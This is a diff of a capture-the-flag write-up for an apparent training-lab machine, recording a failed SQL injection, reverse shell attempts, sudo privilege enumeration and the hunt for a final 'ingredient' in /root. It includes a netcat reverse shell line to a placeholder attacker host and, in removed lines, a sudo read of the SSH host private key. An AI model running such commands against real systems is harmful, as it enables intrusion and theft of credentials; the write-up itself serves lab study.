@@ -94,7 +94,7 @@ I attempted a SQL injection attack on the login form, in hopes of potentially di
 
 The database used in the system seems to either not use an SQL-based database, or is simply not vulnerable to a SQL injection attack.
 
-I decided to focus my efforts on the shell environment presented in the interface. To provide myself with a more stable shell experience, I tried to establish a remote shell environment through a few methods: reverse shell and SSH connection.
+I decided to focus my efforts back on the shell environment presented in the interface. To provide myself with a more stable shell experience, I tried to establish a remote shell environment through a few methods: reverse shell and SSH connection.
 
 **Attempts to initiate a reverse shell**
 
@@ -112,29 +112,40 @@ $ nc <attacker> [port] -e /bin/sh # netcat
 $ ...
 ```
 
-**Attempts at abusing my `sudo` privileges to view system logs, SSH configurations, etc.**
+As mentioned before, access to the third ingredient most likely requires a privileged account. Thus, I attempted to escalate my privileges.
+
+**Linux privilege escalation enumeration**
 
 ```bash
+$ id
+... # no dangerous groups such adm
+
+$ find ..
+# no dangerous file privileges
+
 $ sudo -l
 
 Matching Defaults entries for www-data on ip-10-10-49-150:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User www-data may run the following commands on ip-10-10-49-150:
-    (ALL) NOPASSWD: ALL
+    (ALL) NOPASSWD: ALL # root privileges without password!!
     
+```
+
+**Attempts at abusing my `sudo` privileges to view system logs**
+
+```bash
 $ sudo less /var/log/syslog
 ...
 
-$ ls -la /etc/ssh
-...
-
-$ sudo less /etc/ssh/ssh_host_rsa_key
-...
+===
 
 ```
 
 **Finding the last and final ingredient**
+
+Well, turns out, the 3rd ingredient is not hidden within any log files, but simply in the `/root` directory.&#x20;
 
 ```bash
 $ sudo ls -la /root
